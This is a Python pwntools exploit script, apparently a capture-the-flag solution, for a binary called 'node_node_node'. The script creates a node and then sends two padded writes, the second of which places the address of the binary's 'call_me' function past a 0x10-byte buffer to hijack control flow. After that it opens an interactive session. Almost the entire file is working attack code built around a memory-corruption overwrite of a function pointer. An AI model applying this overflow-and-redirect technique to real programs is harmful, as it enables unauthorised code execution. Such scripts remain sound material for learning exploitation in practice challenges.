#!/usr/bin/python3
from pwn import * 

exe = ELF('./node_node_node', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x00000000004015cc
		c
		''')

HOST = 0
PORT = 0

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)
#GDB()
input()
sla(b'>> \n', b'1')
sla(b'Id: \n', b'0')
sla(b'>> \n', b'3')
sla(b'Read from: \n', b'0')
sa(b'Data: \n', b'A' * (0x10 - 3))
sla(b'>> \n', b'3')
sla(b'Read from: \n', b'0')
sa(b'Data: \n', b'A' * 3 + p64(exe.sym.call_me))


p.interactive()